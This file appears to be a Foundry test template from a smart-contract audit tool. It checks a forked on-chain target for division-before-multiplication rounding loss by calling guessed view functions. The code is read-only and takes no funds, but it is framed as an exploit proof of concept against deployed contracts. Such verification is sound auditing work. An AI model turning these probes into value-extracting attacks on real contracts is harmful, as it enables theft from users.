// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Division before multiplication (precision loss)
/// @notice Detector: div-before-mul. The target computes
///         amount / total * share (divide first). Integer division
///         truncates, so small amounts round to ZERO -- users lose dust,
///         or an attacker exploits the rounding for free value.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt calculate() / total() /
///      share() to the target's real functions.

interface IVictim {
    function calculate(uint256 amount) external view returns (uint256);
    function total() external view returns (uint256);
    function share() external view returns (uint256);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// A uint reader. The reader is a GUESS too, and a single wrong name reads
    /// as "not reproduced" for a vulnerability that exists under another.
    function _readUint(string memory label, bytes memory data) internal view returns (bool found, uint256 v) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        return (false, 0);
    }

    function test_exploit() public {
        bool found;
        uint256 total;
        uint256 share;

        (found, total) = _readUint("total()", abi.encodeWithSignature("total()"));
        if (!found) (found, total) = _readUint("totalSupply()", abi.encodeWithSignature("totalSupply()"));
        if (!found) (found, total) = _readUint("totalAssets()", abi.encodeWithSignature("totalAssets()"));
        require(
            found && total > 1,
            "no total reader worked (tried total(), totalSupply(), totalAssets()), or the total is too small to show rounding. This does NOT establish safety."
        );

        (found, share) = _readUint("share()", abi.encodeWithSignature("share()"));
        if (!found) (found, share) = _readUint("sharePrice()", abi.encodeWithSignature("sharePrice()"));
        if (!found) (found, share) = _readUint("price()", abi.encodeWithSignature("price()"));
        if (!found) (found, share) = _readUint("exchangeRate()", abi.encodeWithSignature("exchangeRate()"));
        require(
            found,
            "no share reader worked (tried share(), sharePrice(), price(), exchangeRate()). This does NOT establish safety."
        );

        // Small amount: div-first gives 0, mul-first gives > 0.
        uint256 smallAmount = total / 2;
        uint256 expectedMulFirst = (smallAmount * share) / total;
        require(expectedMulFirst > 0, "amount too small to distinguish orderings");

        // The conversion under test is a guess too.
        uint256 got;
        (found, got) = _readUint("calculate(uint256)", abi.encodeWithSignature("calculate(uint256)", smallAmount));
        if (!found) (found, got) = _readUint("convert(uint256)", abi.encodeWithSignature("convert(uint256)", smallAmount));
        if (!found) (found, got) = _readUint("getAmount(uint256)", abi.encodeWithSignature("getAmount(uint256)", smallAmount));
        if (!found) (found, got) = _readUint("quote(uint256)", abi.encodeWithSignature("quote(uint256)", smallAmount));
        if (!found) (found, got) = _readUint("calculateAmount(uint256)", abi.encodeWithSignature("calculateAmount(uint256)", smallAmount));
        require(
            found,
            "no conversion reader worked (tried calculate(uint256), convert(uint256), getAmount(uint256), quote(uint256), calculateAmount(uint256)). This does NOT establish safety."
        );

        console.log("mul-first expected:", expectedMulFirst);
        console.log("target returned:", got);
        assertEq(
            got,
            0,
            "the conversion did not truncate to zero, so no div-before-mul loss was shown. This does NOT establish safety: the conversion may be named differently or round deliberately."
        );
    }
}
